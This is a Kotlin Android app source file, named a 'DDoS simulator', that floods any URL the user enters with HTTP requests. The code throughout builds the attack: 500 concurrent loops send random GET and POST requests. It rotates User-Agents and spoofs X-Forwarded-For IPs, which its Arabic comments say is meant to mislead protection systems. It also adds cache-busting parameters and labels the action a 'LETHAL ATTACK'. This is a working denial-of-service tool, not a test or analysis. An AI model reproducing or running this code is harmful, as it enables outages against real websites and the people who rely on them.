package com.example.ddossimulator

import android.graphics.Color
import android.os.Bundle
import android.widget.Button
import android.widget.EditText
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.IOException
import java.util.*
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicInteger

class MainActivity : AppCompatActivity() {

    private var isAttacking = false
    private val attackJobs = mutableListOf<Job>()
    private val successCount = AtomicInteger(0)
    private val failCount = AtomicInteger(0)
    private var startTime: Long = 0
    
    private val threadCount = 500 

    // قائمة User-Agents متنوعة لتضليل أنظمة الحماية
    private val userAgents = listOf(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0"
    )

    private val client = OkHttpClient.Builder()
        .connectionPool(ConnectionPool(1000, 10, TimeUnit.MINUTES))
        .connectTimeout(1, TimeUnit.SECONDS)
        .readTimeout(1, TimeUnit.SECONDS)
        .writeTimeout(1, TimeUnit.SECONDS)
        .retryOnConnectionFailure(true)
        .build()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        val urlInput = findViewById<EditText>(R.id.urlInput)
        val startBtn = findViewById<Button>(R.id.startBtn)
        val successText = findViewById<TextView>(R.id.successText)
        val failText = findViewById<TextView>(R.id.failText)
        val totalText = findViewById<TextView>(R.id.totalText)
        val speedText = findViewById<TextView>(R.id.speedText)
        val statusLabel = findViewById<TextView>(R.id.statusLabel)

        startBtn.setOnClickListener {
            if (!isAttacking) {
                val targetUrl = urlInput.text.toString()
                if (targetUrl.isNotEmpty() && (targetUrl.startsWith("http://") || targetUrl.startsWith("https://"))) {
                    isAttacking = true
                    startBtn.text = "STOP LETHAL ATTACK"
                    startBtn.setBackgroundColor(Color.DKGRAY)
                    statusLabel.text = "STATUS: LETHAL MODE ACTIVE"
                    statusLabel.setTextColor(Color.parseColor("#FF0000"))
                    
                    startLethalAttack(targetUrl, successText, failText, totalText, speedText)
                } else {
                    statusLabel.text = "ERROR: INVALID URL"
                    statusLabel.setTextColor(Color.RED)
                }
            } else {
                isAttacking = false
                stopAttack()
                startBtn.text = "LAUNCH ATTACK"
                startBtn.setBackgroundColor(Color.parseColor("#FF0000"))
                statusLabel.text = "STATUS: STOPPED"
                statusLabel.setTextColor(Color.GRAY)
            }
        }
    }

    private fun startLethalAttack(
        targetUrl: String, 
        successView: TextView, 
        failView: TextView, 
        totalView: TextView, 
        speedView: TextView
    ) {
        successCount.set(0)
        failCount.set(0)
        startTime = System.currentTimeMillis()
        val scope = CoroutineScope(Dispatchers.IO)
        val random = Random()
        
        repeat(threadCount) {
            val job = scope.launch {
                while (isActive && isAttacking) {
                    try {
                        // توليد Payload عشوائي لإجهاد الخادم
                        val randomPayload = UUID.randomUUID().toString() + " " + System.currentTimeMillis()
                        val body = randomPayload.toRequestBody("text/plain".toMediaType())
                        
                        // اختيار نوع الطلب عشوائياً (GET أو POST)
                        val requestBuilder = Request.Builder()
                            .url(targetUrl + "?v=" + random.nextInt(1000000)) // منع الـ Caching
                            .header("User-Agent", userAgents.random())
                            .header("X-Forwarded-For", "${random.nextInt(255)}.${random.nextInt(255)}.${random.nextInt(255)}.${random.nextInt(255)}")
                            .header("Cache-Control", "no-cache, no-store, must-revalidate")
                            .header("Pragma", "no-cache")
                            .header("Expires", "0")

                        if (random.nextBoolean()) {
                            requestBuilder.post(body)
                        } else {
                            requestBuilder.get()
                        }

                        val request = requestBuilder.build()

                        client.newCall(request).enqueue(object : Callback {
                            override fun onFailure(call: Call, e: IOException) {
                                failCount.incrementAndGet()
                            }

                            override fun onResponse(call: Call, response: Response) {
                                if (response.isSuccessful) {
                                    successCount.incrementAndGet()
                                } else {
                                    failCount.incrementAndGet()
                                }
                                response.close()
                            }
                        })
                    } catch (e: Exception) {
                        failCount.incrementAndGet()
                    }
                    delay(1) 
                }
            }
            attackJobs.add(job)
        }

        CoroutineScope(Dispatchers.Main).launch {
            while (isAttacking) {
                val elapsedSeconds = (System.currentTimeMillis() - startTime) / 1000.0
                val success = successCount.get()
                val fail = failCount.get()
                val total = success + fail
                val rps = if (elapsedSeconds > 0) (total / elapsedSeconds).toInt() else 0
                
                successView.text = success.toString()
                failView.text = fail.toString()
                totalView.text = total.toString()
                speedView.text = rps.toString()
                
                delay(500)
            }
        }
    }

    private fun stopAttack() {
        attackJobs.forEach { it.cancel() }
        attackJobs.clear()
        client.dispatcher.cancelAll()
    }
}
